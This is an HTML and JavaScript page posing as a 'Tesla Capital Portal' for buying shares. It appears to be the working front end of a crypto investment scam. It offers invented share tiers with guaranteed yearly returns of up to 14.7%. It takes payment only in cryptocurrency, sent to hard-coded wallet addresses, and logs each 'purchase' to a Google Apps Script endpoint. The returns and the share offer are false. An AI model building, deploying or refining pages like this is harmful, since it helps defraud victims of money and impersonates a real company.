<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Capital Portal - Buy Shares</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        /* Style the custom card selector grid */
        .tier-card-radio { display: none; }
        .tier-card-label {
            background: #1c1c1c;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .tier-card-radio:checked + .tier-card-label {
            border-color: #E82127;
            background: rgba(232, 33, 39, 0.05);
            box-shadow: 0 0 12px rgba(232, 33, 39, 0.15);
        }
    </style>
</head>
<body class="text-white min-h-screen flex flex-col justify-between pb-8">

    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d]">
        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">
            ‹ Back to Hub
        </a>
        <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Equity Acquisition</span>
        <div class="w-12"></div>
    </header>

    <main class="max-w-md w-full mx-auto px-4 mt-6 flex-grow">
        <div id="formCard" class="bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl">
            <h2 class="text-xl font-bold tracking-tight mb-1">Acquire Tesla Shares</h2>
            <p class="text-xs text-neutral-400 mb-6">Select your institutional share tier and allocation parameters.</p>

            <div id="statusBox" class="hidden mb-4 p-4 text-sm rounded-xl border"></div>

            <form id="shareForm" class="space-y-5">
                <div>
                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-3">Select Share Class Tier</label>
                    <div class="space-y-3">
                        <div>
                            <input type="radio" id="tierA" name="customTier" value="Tesla Common Equity (Class A)" class="tier-card-radio" checked onchange="syncTier(this.value)">
                            <label for="tierA" class="tier-card-label">
                                <div class="flex flex-col">
                                    <span class="text-sm font-semibold text-white tracking-tight">Tesla Common Equity (Class A)</span>
                                    <span class="text-[11px] text-neutral-400 mt-0.5">Minimum Allocation: $100</span>
                                </div>
                                <span class="bg-neutral-800 text-[11px] font-bold px-2.5 py-1 rounded-md text-neutral-200 shrink-0 border border-neutral-700/50">4.5% APY</span>
                            </label>
                        </div>

                        <div>
                            <input type="radio" id="tierB" name="customTier" value="Tesla Energy & Infrastructure Bond" class="tier-card-radio" onchange="syncTier(this.value)">
                            <label for="tierB" class="tier-card-label">
                                <div class="flex flex-col">
                                    <span class="text-sm font-semibold text-white tracking-tight">Tesla Energy & Infrastructure Bond</span>
                                    <span class="text-[11px] text-neutral-400 mt-0.5">Minimum Allocation: $2,500</span>
                                </div>
                                <span class="bg-red-950/40 text-[11px] font-bold px-2.5 py-1 rounded-md text-[#E82127] shrink-0 border border-red-900/30">8.2% APY</span>
                            </label>
                        </div>

                        <div>
                            <input type="radio" id="tierC" name="customTier" value="Tesla Future Mobility (FSD/AI) Venture" class="tier-card-radio" onchange="syncTier(this.value)">
                            <label for="tierC" class="tier-card-label">
                                <div class="flex flex-col">
                                    <span class="text-sm font-semibold text-white tracking-tight">Tesla Future Mobility Venture</span>
                                    <span class="text-[11px] text-neutral-400 mt-0.5">Minimum Allocation: $10,000</span>
                                </div>
                                <span class="bg-neutral-800 text-[11px] font-bold px-2.5 py-1 rounded-md text-neutral-200 shrink-0 border border-neutral-700/50">14.7% APY</span>
                            </label>
                        </div>
                    </div>

                    <select id="tierSelect" class="hidden">
                        <option value="Tesla Common Equity (Class A)">Tesla Common Equity (Class A) — Min $100 [4.5% APY]</option>
                        <option value="Tesla Energy & Infrastructure Bond">Tesla Energy & Infrastructure Bond — Min $2,500 [8.2% APY]</option>
                        <option value="Tesla Future Mobility (FSD/AI) Venture">Tesla Future Mobility Venture — Min $10,000 [14.7% APY]</option>
                    </select>
                </div>

                <div>
                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Select Payment Network</label>
                    <select id="assetSelect" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
                        <option value="USDT (TRC20)">USDT (Tron Network - TRC20)</option>
                        <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
                        <option value="Ethereum (ETH)">Ethereum (ERC20)</option>
                        <option value="USDC (ERC20)">USD Coin (Ethereum - ERC20)</option>
                        <option value="USDT (ERC20)">USDT (Ethereum - ERC20)</option>
                        <option value="Solana (SOL)">Solana (SOL)</option>
                        <option value="Litecoin (LTC)">Litecoin (LTC)</option>
                        <option value="XRP (XRP)">XRP (XRP)</option>
                        <option value="Tron (TRX)">Tron (TRX)</option>
                        <option value="Dash (DASH)">Dash (DASH)</option>
                    </select>
                </div>

                <div>
                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Purchase Amount (USD)</label>
                    <div class="relative">
                        <span class="absolute left-4 top-3 text-neutral-500 font-medium text-sm">$</span>
                        <input type="number" id="shareAmount" required min="100" placeholder="100.00" 
                            class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl pl-8 pr-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm font-semibold">
                    </div>
                </div>

                <button type="submit" id="submitBtn" 
                    class="w-full bg-[#E82127] hover:bg-[#c61a1f] active:scale-[0.99] text-white font-medium py-3.5 rounded-xl transition-all text-sm shadow-lg shadow-red-900/20 mt-4">
                    Initialize Share Purchase
                </button>
            </form>
        </div>

        <div id="paymentCard" class="hidden bg-[#141414] border border-[#222] rounded-2xl p-5 shadow-2xl text-center space-y-5">
            
            <div class="bg-[#241a0d] border border-[#3d2a13] rounded-xl p-3 text-left flex items-start space-x-2.5">
                <span class="text-[#f0a23e] text-sm mt-0.5">⚠️</span>
                <p class="text-[11px] text-[#f0a23e] font-medium leading-normal">
                    Only send <span id="bannerAsset">USDT (TRC20)</span> assets to this address. Other networks will result in permanent loss.
                </p>
            </div>

            <div class="bg-white rounded-2xl p-4 inline-block shadow-lg">
                <img id="qrCodeImg" src="" alt="Deposit QR Code" class="w-44 h-44 mx-auto">
                <p class="text-[11px] text-neutral-500 font-bold tracking-tight mt-2" id="walletLabel">USDT (TRC20)</p>
            </div>

            <div class="space-y-3 text-left">
                <div>
                    <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Amount Due</label>
                    <div id="payAmountDisplay" class="bg-[#1c1c1c] border border-[#282828] rounded-xl px-4 py-3 text-sm font-mono font-bold text-white">
                        0.00
                    </div>
                </div>

                <div>
                    <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Destination Network Address</label>
                    <div class="bg-[#1c1c1c] border border-[#282828] rounded-xl p-3 font-mono text-xs text-neutral-300 flex justify-between items-center gap-3">
                        <span id="walletAddress" class="break-all tracking-tight select-all">Fetching...</span>
                        <button type="button" id="copyBtn" onclick="copyWalletAddress()" class="bg-neutral-800 hover:bg-neutral-700 active:bg-neutral-600 p-2.5 rounded-lg transition-all flex items-center justify-center shrink-0 border border-neutral-700">
                            <svg id="copyIcon" class="w-4 h-4 text-neutral-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                            </svg>
                            <span id="copyTxt" class="hidden text-[10px] font-bold text-emerald-400 px-1">Copied!</span>
                        </button>
                    </div>
                </div>
            </div>

            <div class="pt-2 space-y-2.5">
                <a id="trustWalletLink" href="#" class="w-full bg-[#0052FF] hover:bg-[#0045d8] text-white font-medium py-3.5 rounded-xl block transition-all text-sm shadow-lg font-semibold tracking-wide">
                    Pay via Trust Wallet
                </a>
                <a href="dashboard.html" class="w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-400 font-medium py-3 rounded-xl block transition-all text-xs border border-neutral-800">
                    I Have Dispatched Payment
                </a>
            </div>
        </div>
    </main>

    <script>
        const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
        const userId = localStorage.getItem("userId");

        // Object holding exact wallet addresses mapped out from your original image data
        const wallets = {
            "Dash (DASH)": {
                address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j",
                scheme: "dash:XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j",
                label: "Dash (DASH)"
            },
            "Litecoin (LTC)": {
                address: "ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j",
                scheme: "litecoin:ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j",
                label: "Litecoin (LTC)"
            },
            "XRP (XRP)": {
                address: "rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q",
                scheme: "xrpl:rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q",
                label: "XRP (XRP)"
            },
            "Tron (TRX)": {
                address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6",
                scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6",
                label: "Tron (TRX)"
            },
            "USDC (ERC20)": {
                address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
                scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
                label: "USD Coin (ERC20)"
            },
            "USDT (ERC20)": {
                address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
                scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
                label: "USDT (ERC20)"
            },
            "Ethereum (ETH)": {
                address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
                scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
                label: "Ethereum (ETH)"
            },
            "Solana (SOL)": {
                address: "3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b",
                scheme: "solana:3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b",
                label: "Solana (SOL)"
            },
            "Bitcoin (BTC)": {
                address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e",
                scheme: "bitcoin:bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e",
                label: "Bitcoin (BTC)"
            },
            "USDT (TRC20)": {
                address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6",
                scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6",
                label: "Tether USDT (TRC20)"
            }
        };

        if (!userId) {
            window.location.href = "index.html";
        }

        // Bridge function to sync custom card choices over to the underlying native element safely
        function syncTier(val) {
            const selectEl = document.getElementById('tierSelect');
            selectEl.value = val;
            // Programmatically trigger original change handler to enforce input.min / placeholder rules
            selectEl.dispatchEvent(new Event('change'));
        }

        // Handle minimum rule adjustments when changing share tiers
        document.getElementById('tierSelect').addEventListener('change', (e) => {
            const input = document.getElementById('shareAmount');
            if (e.target.value.includes("Common Equity")) input.min = 100;
            else if (e.target.value.includes("Infrastructure Bond")) input.min = 2500;
            else if (e.target.value.includes("Future Mobility")) input.min = 10000;
            input.placeholder = `${input.min}.00`;
        });

        async function copyWalletAddress() {
            const addressText = document.getElementById('walletAddress').innerText;
            const copyIcon = document.getElementById('copyIcon');
            const copyTxt = document.getElementById('copyTxt');

            try {
                await navigator.clipboard.writeText(addressText);
                copyIcon.classList.add('hidden');
                copyTxt.classList.remove('hidden');
                setTimeout(() => {
                    copyTxt.classList.add('hidden');
                    copyIcon.classList.remove('hidden');
                }, 2000);
            } catch (err) {
                const el = document.createElement('textarea');
                el.value = addressText;
                document.body.appendChild(el);
                el.select();
                document.execCommand('copy');
                document.body.removeChild(el);
            }
        }

        document.getElementById('shareForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const statusBox = document.getElementById('statusBox');
            const submitBtn = document.getElementById('submitBtn');
            
            statusBox.classList.add('hidden');
            submitBtn.disabled = true;
            submitBtn.innerText = "Transmitting purchase requests...";

            const amount = parseFloat(document.getElementById('shareAmount').value);
            const asset = document.getElementById('assetSelect').value;
            const tier = document.getElementById('tierSelect').value;
            const selectedWallet = wallets[asset];

            const payload = {
                action: "submitInvestment", // Maps cleanly into your existing row submission architecture
                userId: userId,
                amount: amount,
                asset: `${tier} via ${asset}`
            };

            try {
                const response = await fetch(API_URL, {
                    method: "POST",
                    mode: "cors",
                    headers: { "Content-Type": "text/plain" },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();

                if (result.status === "success") {
                    document.getElementById('walletAddress').innerText = selectedWallet.address;
                    document.getElementById('payAmountDisplay').innerText = `$${amount.toFixed(2)} USD (${asset.split(' ')[0]})`;
                    document.getElementById('bannerAsset').innerText = selectedWallet.label;
                    document.getElementById('walletLabel').innerText = selectedWallet.label;
                    
                    document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(selectedWallet.address)}`;
                    document.getElementById('trustWalletLink').href = `${selectedWallet.scheme}?amount=${amount}`;

                    document.getElementById('formCard').classList.add('hidden');
                    document.getElementById('paymentCard').classList.remove('hidden');
                } else {
                    throw new Error(result.message);
                }
            } catch (err) {
                statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400";
                statusBox.innerText = err.message || "Failed to establish purchase link.";
                statusBox.classList.remove('hidden');
                submitBtn.disabled = false;
                submitBtn.innerText = "Initialize Share Purchase";
            }
        });
    </script>
</body>
</html>
